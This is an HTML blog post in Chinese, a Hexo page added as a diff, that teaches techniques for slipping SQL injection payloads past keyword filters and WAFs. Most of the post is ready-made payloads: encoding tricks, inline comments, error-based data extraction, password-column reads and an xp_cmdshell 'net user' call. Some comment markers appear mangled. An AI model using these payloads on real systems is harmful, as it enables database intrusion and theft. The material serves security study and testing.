@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="123456781) 大小写混合 2)替换关键字 3)使用编码 4)使用注释 5)等价函数与命令 6)使用特殊符号 7)缓冲区溢出 8)整合绕过 a) 大小写绕过123大小写绕过用于只针对小写或大写的关键字匹配技术正则表达式/express/i 匹配时大小写不敏感便无法绕过这是最简单的绕过技术z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 b)替换">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入下的bypass">
+<meta property="og:url" content="elssm.github.io/2018/05/03/SQL注入下的bypass/index.html">
+<meta property="og:site_name" content="ELSSM">
+<meta property="og:description" content="123456781) 大小写混合 2)替换关键字 3)使用编码 4)使用注释 5)等价函数与命令 6)使用特殊符号 7)缓冲区溢出 8)整合绕过 a) 大小写绕过123大小写绕过用于只针对小写或大写的关键字匹配技术正则表达式/express/i 匹配时大小写不敏感便无法绕过这是最简单的绕过技术z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 b)替换">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-05-03T08:27:56.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入下的bypass">
+<meta name="twitter:description" content="123456781) 大小写混合 2)替换关键字 3)使用编码 4)使用注释 5)等价函数与命令 6)使用特殊符号 7)缓冲区溢出 8)整合绕过 a) 大小写绕过123大小写绕过用于只针对小写或大写的关键字匹配技术正则表达式/express/i 匹配时大小写不敏感便无法绕过这是最简单的绕过技术z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 b)替换">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="elssm.github.io/2018/05/03/SQL注入下的bypass/">
+
+
+
+
+
+  <title>SQL注入下的bypass | ELSSM</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ELSSM</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">安全小白</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="elssm.github.io/2018/05/03/SQL注入下的bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Caoyifan">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ELSSM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入下的bypass</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-03T16:09:14+08:00">
+                2018-05-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1) 大小写混合 </span><br><span class="line">2)替换关键字 </span><br><span class="line">3)使用编码 </span><br><span class="line">4)使用注释 </span><br><span class="line">5)等价函数与命令 </span><br><span class="line">6)使用特殊符号 </span><br><span class="line">7)缓冲区溢出 </span><br><span class="line">8)整合绕过</span><br></pre></td></tr></table></figure>
+<h3 id="a-大小写绕过"><a href="#a-大小写绕过" class="headerlink" title="a) 大小写绕过"></a>a) 大小写绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大小写绕过用于只针对小写或大写的关键字匹配技术正则表达式/express/i 匹配时大小写不敏感便无法绕过这是最简单的绕过技术</span><br><span class="line"></span><br><span class="line">z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure>
+<h3 id="b-替换关键字"><a href="#b-替换关键字" class="headerlink" title="b)替换关键字"></a>b)替换关键字</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</span><br><span class="line"></span><br><span class="line">z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 </span><br><span class="line">替换关键字同样是很基础的技术也可以构造得更复杂SeLSeselectleCTecT关键要看正则表达式会进行几次匹配处理了</span><br></pre></td></tr></table></figure>
+<h3 id="c-使用编码"><a href="#c-使用编码" class="headerlink" title="c)使用编码"></a>c)使用编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在Chrome中输入一个链接非保留字的字符浏览器会对其URL编码如空格变为%20、单引号%27、左括号%28、右括号%29</span><br><span class="line"></span><br><span class="line">普通的URL编码可能无法实现绕过不过存在某种情况URL编码只进行了一次解码过滤可以用两次编码绕过</span><br><span class="line"></span><br><span class="line">page.php?id=1%252f%252a*/UNION%252f%252a/SELECT</span><br></pre></td></tr></table></figure>
+<h3 id="2-十六进制编码"><a href="#2-十六进制编码" class="headerlink" title="2.十六进制编码"></a>2.十六进制编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">z.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/1,2,3,4,SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</span><br><span class="line">示例代码中前者是对单个字符十六进制编码后者则是对整个字符串编码对整个字符串编码相对来说较少见一点</span><br></pre></td></tr></table></figure>
+<h3 id="3-Unicode编码"><a href="#3-Unicode编码" class="headerlink" title="3.Unicode编码"></a>3.Unicode编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Unicode有所谓的标准编码和非标准编码假设我们用的utf-8为标准编码那么西欧语系所使用的就是非标准编码了</span><br><span class="line"></span><br><span class="line">看一下常用的几个符号的一些Unicode编码</span><br><span class="line"></span><br><span class="line">单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</span><br><span class="line"></span><br><span class="line">空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br><span class="line"></span><br><span class="line">左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br><span class="line"></span><br><span class="line">右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line"></span><br><span class="line">?id=10%D6&apos;%20AND%201=2%23　　</span><br><span class="line"></span><br><span class="line">SELECT &apos;?&apos;=&apos;A&apos;; #1</span><br><span class="line">两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\&apos;，那么就变成了%D6%5C&apos;，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用。</span><br><span class="line"></span><br><span class="line">第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过。</span><br></pre></td></tr></table></figure>
+<h3 id="d-使用注释"><a href="#d-使用注释" class="headerlink" title="d) 使用注释"></a>d) 使用注释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看一下常见的用于注释的符号有哪些</span><br><span class="line"></span><br><span class="line">//, -- , /**/, #, --+,-- -, ;--a</span><br></pre></td></tr></table></figure>
+<h4 id="1-普通注释"><a href="#1-普通注释" class="headerlink" title="1.普通注释"></a>1.普通注释</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4</span><br><span class="line">&apos;union%a0select pass from users# </span><br><span class="line">/**/在构造的查询语句中插入注释规避对空格的依赖或关键字识别#、--+用于终结语句的查询</span><br></pre></td></tr></table></figure>
+<h4 id="2-内联注释"><a href="#2-内联注释" class="headerlink" title="2.内联注释"></a>2.内联注释</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">相比普通注释内联注释用的更多/!content/只有MySQL会正常识别content的内容其他 </span><br><span class="line"></span><br><span class="line">index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 </span><br><span class="line">?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4… </span><br><span class="line">两个示例中前者使用内联注释后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分要做到这一点后面讨论的特殊符号也能实现当然前提是包括/、*在内的这些字符能正常使用。</span><br></pre></td></tr></table></figure>
+<h3 id="e-等价函数与命令"><a href="#e-等价函数与命令" class="headerlink" title="e)等价函数与命令"></a>e)等价函数与命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">有些函数或命令因其关键字被检测出来而无法使用但是在很多情况下可以使用与之等价或类似的代码替代其使用</span><br><span class="line"></span><br><span class="line">1.函数或变量</span><br><span class="line"></span><br><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br><span class="line">举例substring()和substr()无法使用时</span><br><span class="line"></span><br><span class="line">?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　 </span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">substr((select &apos;password&apos;),1,1) = 0x70 </span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x69) = 1 </span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x70) = 0 </span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x71) = -1 </span><br><span class="line"></span><br><span class="line">2.符号</span><br><span class="line"></span><br><span class="line">and和or有可能不能使用可以试下&amp;&amp;和||能不能用还有=不能使用的情况可以考虑尝试&lt;、&gt;因为如果不小于又不大于那便是等于了</span><br><span class="line"></span><br><span class="line">再看一下用得很多的空格可以使用如下符号代替其使用</span><br><span class="line"></span><br><span class="line">%20 %09 %0a %0b %0c %0d %a0 /**/ </span><br><span class="line">3.生僻函数</span><br><span class="line"></span><br><span class="line">MySQL/PostgreSQL支持XML函数</span><br><span class="line"></span><br><span class="line">Select UpdateXML(&apos; &apos;,&apos;/script/@x/&apos;,&apos;src=//evil.com&apos;);</span><br><span class="line">?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line">SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror));　//postgresql</span><br><span class="line">?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line">MySQL、PostgreSQL、Oracle它们都有许多自己的函数基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能而且代价太大因此黑名单的确是更适合处理已知的情况</span><br></pre></td></tr></table></figure>
+<h3 id="f-特殊符号"><a href="#f-特殊符号" class="headerlink" title="f) 特殊符号"></a>f) 特殊符号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.使用反引号，例如selectversion()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</span><br><span class="line"></span><br><span class="line">2.神奇的&quot;-+.&quot;，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</span><br><span class="line"></span><br><span class="line">3.@符号，select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量</span><br><span class="line"></span><br><span class="line">4.Mysql function() as xxx 也可不用as和空格　　 select-count(id)test from users; //绕过空格限制</span><br><span class="line"></span><br><span class="line">`、~、!、@、%、()、[]、.、-、+ 、|、%00</span><br><span class="line"></span><br><span class="line">举例</span><br><span class="line"></span><br><span class="line">关键字拆分</span><br><span class="line"></span><br><span class="line">&apos;se&apos;+&apos;lec&apos;+&apos;t&apos;</span><br><span class="line"></span><br><span class="line">%S%E%L%E%C%T 1</span><br><span class="line"></span><br><span class="line">1.aspx?id=1;EXEC(&apos;ma&apos;+&apos;ster..x&apos;+&apos;p_cm&apos;+&apos;dsh&apos;+&apos;ell &quot;net user&quot;&apos;)</span><br><span class="line"></span><br><span class="line">!和()&apos; or --+2=- -!!!&apos;2</span><br><span class="line"></span><br><span class="line">id=1+(UnI)(oN)+(SeL)(EcT)</span><br><span class="line"></span><br><span class="line">//有看到说Access中,”[]”用于表和列,”()”用于数值也可以做分隔</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;, &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN</span><br><span class="line">使用这些&quot;特殊符号&quot;实现绕过是一件很细微的事情一方面各数据库对符号的处理是不尽相同的另一方面你得充分了解这些符号的特性和使用方法才能会考虑利用其实现绕过</span><br></pre></td></tr></table></figure>
+<h3 id="g-缓冲区溢出-Advanced"><a href="#g-缓冲区溢出-Advanced" class="headerlink" title="g) 缓冲区溢出(Advanced)"></a>g) 缓冲区溢出(Advanced)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">缓冲区溢出用于对付WAF在内的软件本身有不少WAF是C语言写的而C语言自身没有缓冲区保护机制因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug从而实现绕过</span><br><span class="line"></span><br><span class="line">举例</span><br><span class="line"></span><br><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br><span class="line"></span><br><span class="line">示例0xA*1000指0xA后面”A&quot;重复1000次一般来说对应用软件构成缓冲区溢出都需要较大的测试长度这里1000只做参考也许在有些情况下可能不需要这么长也能溢出</span><br></pre></td></tr></table></figure>
+<h3 id="i-整合绕过"><a href="#i-整合绕过" class="headerlink" title="i) 整合绕过"></a>i) 整合绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">整合的意思是结合使用前面谈到的各种绕过技术单一的技术可能无法绕过过滤机制但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说关系到总体与局部和另一方面则是多种技术的使用创造了更多的可能性组合除非每一种技术单独都无法使用否则它们能产生比自身大得多的能量。</span><br><span class="line"></span><br><span class="line">举例</span><br><span class="line"></span><br><span class="line">z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/!uNIOn/+/!SeLECt/+1,2,3,4…</span><br><span class="line"></span><br><span class="line">id=1/!UnIoN/+SeLeCT+1,2,concat(/!table_name/)+FrOM /information_schema/.tables /*!WHERE /+/!TaBlE_ScHeMa*/+like+database()– -</span><br><span class="line"></span><br><span class="line">?id=-725+/!UNION/+/!SELECT/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/!INFORMATION_SCHEM/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- </span><br><span class="line"></span><br><span class="line">0x03 SQLi Filter的实现及Evasion</span><br><span class="line"></span><br><span class="line">SQL Injection时用得最多的一些关键字如下</span><br><span class="line"></span><br><span class="line">and, or, union, where, limit, group by, select, &apos;, hex, substr, white space</span><br><span class="line"></span><br><span class="line">对它们的检测完整正则表达式为</span><br><span class="line"></span><br><span class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id）</span><br><span class="line"></span><br><span class="line">and =&gt; &amp;&amp; 　　or =&gt; ||</span><br><span class="line"></span><br><span class="line">union select user, password from users　　 =&gt;　　1 || (select user from users where user_id = 1) = &apos;admin</span><br><span class="line"></span><br><span class="line">1 || (select user from users where user_id = 1) = &apos;admin&apos;　　=&gt;　　1 || (select user from users limit 1) = &apos;admin</span><br><span class="line"></span><br><span class="line">1 || (select user from users limit 1) = &apos;admin&apos; =&gt;　　1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;</span><br><span class="line"></span><br><span class="line">1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos; =&gt;　1 || (select substr(group_concat(user_id),1,1) user from users )=1</span><br><span class="line"></span><br><span class="line">1 || (select substr(group_concat(user_id),1,1) user from users) = 1 =&gt; 1 || 1 = 1 into outfile &apos;result.txt&apos;　或者 1 || substr(user,1,1) = &apos;a&apos;　</span><br><span class="line"></span><br><span class="line">1 || (select substr(group_concat(user_id),1,1) user from users) = 1 　=&gt;　　1 || user_id is not null 或者 1 || substr(user,1,1) = 0x61</span><br><span class="line"></span><br><span class="line">　　　或者 1 || substr(user,1,1) = unhex(61)　</span><br><span class="line"></span><br><span class="line">1 || substr(user,1,1) = unhex(61)　　=&gt; 1 || substr(user,1,1) = lower(conv(11,10,36))</span><br><span class="line"></span><br><span class="line">1 || substr(user,1,1) = lower(conv(11,10,36)) =&gt;　　1 || lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">1 || lpad(user,7,1)　　=&gt;　　1%0b||%0blpad(user,7,1)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/14/DDCTF-writeup/" rel="next" title="DDCTF writeup">
+                <i class="fa fa-chevron-left"></i> DDCTF writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/04/2018-0ctf-ezdoor复现/" rel="prev" title="2018 0ctf ezdoor题目复现">
+                2018 0ctf ezdoor题目复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Caoyifan</p>
+              <p class="site-description motion-element" itemprop="description">web漏洞 代码审计 xss</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/elssm" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://elssm.lofter.com" target="_blank" title="Lofter">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Lofter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#a-大小写绕过"><span class="nav-number">1.</span> <span class="nav-text">a) 大小写绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#b-替换关键字"><span class="nav-number">2.</span> <span class="nav-text">b)替换关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c-使用编码"><span class="nav-number">3.</span> <span class="nav-text">c)使用编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-十六进制编码"><span class="nav-number">4.</span> <span class="nav-text">2.十六进制编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Unicode编码"><span class="nav-number">5.</span> <span class="nav-text">3.Unicode编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#d-使用注释"><span class="nav-number">6.</span> <span class="nav-text">d) 使用注释</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-普通注释"><span class="nav-number">6.1.</span> <span class="nav-text">1.普通注释</span></a></li><li 